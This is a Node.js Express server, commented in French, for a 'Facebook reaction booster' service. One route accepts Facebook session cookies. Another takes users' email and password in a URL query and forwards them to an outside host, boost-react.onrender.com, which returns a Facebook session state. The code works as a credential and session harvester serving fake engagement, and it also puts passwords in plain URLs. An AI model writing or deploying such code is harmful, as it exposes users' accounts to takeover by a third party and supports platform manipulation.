const express = require('express');
const bodyParser = require('body-parser');
const fetch = require('node-fetch');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, 'public')));

// Route pour servir le fichier HTML principal
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Fonction pour gérer la soumission du formulaire
app.post('/react', async (req, res) => {
    const { cookie, link, type } = req.body;

    if (!cookie || !link) {
        return res.status(400).json({ message: "Please fill in all fields to boost your Facebook post reaction." });
    }

    try {
        // Vous pouvez ajouter la logique de traitement ici
        // Par exemple, faire une requête à un autre serveur ou traiter les données

        // Simuler une réponse pour cette démonstration
        const simulatedResponse = { message: "Form submitted successfully!" };

        res.status(200).json(simulatedResponse);
    } catch (error) {
        console.error(error);
        res.status(500).json({ message: "Error: Something went wrong..." });
    }
});

// Fonction pour récupérer l'état de l'application
app.get('/stater', async (req, res) => {
    const { email, password } = req.query;

    if (!email || !password) {
        return res.status(400).send("Please enter both email and password.");
    }

    try {
        const response = await fetch(`https://boost-react.onrender.com/stater?email=${encodeURIComponent(email)}&password=${encodeURIComponent(password)}`);

        if (response.ok) {
            const data = await response.json();
            if (data.appState) {
                res.status(200).json({ appState: data.appState });
            } else {
                res.status(401).send("Login failed or no state received.");
            }
        } else {
            res.status(response.status).send("Error: " + response.statusText);
        }
    } catch (error) {
        console.error(error);
        res.status(500).send("Internal server error");
    }
});

// Démarrer le serveur
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
